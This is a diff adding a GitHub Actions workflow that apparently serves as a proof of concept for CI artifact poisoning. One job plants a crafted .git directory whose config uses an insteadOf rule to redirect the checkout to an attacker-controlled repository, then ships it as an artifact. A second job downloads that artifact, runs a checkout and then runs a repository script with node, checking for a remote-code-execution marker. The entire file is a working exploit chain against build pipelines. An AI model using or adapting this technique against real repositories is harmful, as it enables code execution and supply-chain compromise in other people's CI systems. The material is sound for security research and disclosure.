@@ -1,0 +1,73 @@
+name: poc-artifact-git
+on:
+  workflow_dispatch:
+
+jobs:
+  produce:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build malicious .git directory
+        run: |
+          set -eux
+          rm -rf evil art
+          mkdir evil
+          cd evil
+          git init -q -b main .
+          git config user.email poc@example.com
+          git config user.name poc
+          mkdir -p pwn
+          echo 'staged content from planted repo' > pwn/staged.txt
+          git add -A
+          git commit -qm 'attacker commit'
+          printf '%s\n' \
+            '[core]' \
+            '	repositoryformatversion = 0' \
+            '	filemode = true' \
+            '	bare = false' \
+            '	logallrefupdates = true' \
+            '[remote "origin"]' \
+            '	url = https://github.com/PDFtoMark/gab-poc-gitartifact' \
+            '	fetch = +refs/heads/*:refs/remotes/origin/*' \
+            '[url "https://github.com/PDFtoMark/gab-poc-evil-docs"]' \
+            '	insteadOf = https://github.com/PDFtoMark/gab-poc-gitartifact' \
+            > .git/config
+          cat .git/config
+          cd ..
+          mkdir art
+          cp -r evil/.git art/.git
+          echo 1 > art/pr_number.txt
+      - name: Upload artifact named pr-number
+        uses: actions/upload-artifact@v4
+        with:
+          name: pr-number
+          path: art
+          include-hidden-files: true
+
+  consume:
+    needs: produce
+    runs-on: ubuntu-latest
+    steps:
+      - name: Download untrusted artifact into workspace
+        uses: actions/download-artifact@v4
+        with:
+          name: pr-number
+      - name: Inspect planted .git before checkout
+        run: |
+          set -x
+          ls -la
+          ls -la .git
+          git --git-dir=.git log --oneline || true
+          git --git-dir=.git config --get-all 'url.*.insteadOf' || true
+      - name: Privileged checkout step
+        uses: actions/checkout@v4
+        with:
+          persist-credentials: false
+      - name: Did the checkout use attacker content?
+        run: |
+          set -x
+          git remote -v || true
+          git config --get-all 'url.*.insteadOf' || true
+          ls -la
+          cat PWN.txt || echo 'NO ATTACKER TREE'
+          node -e "require('./.github/scripts/docs_pr_ai_menu.cjs')"
+          cat /tmp/ARTIFACT_GIT_CONFIG_RCE
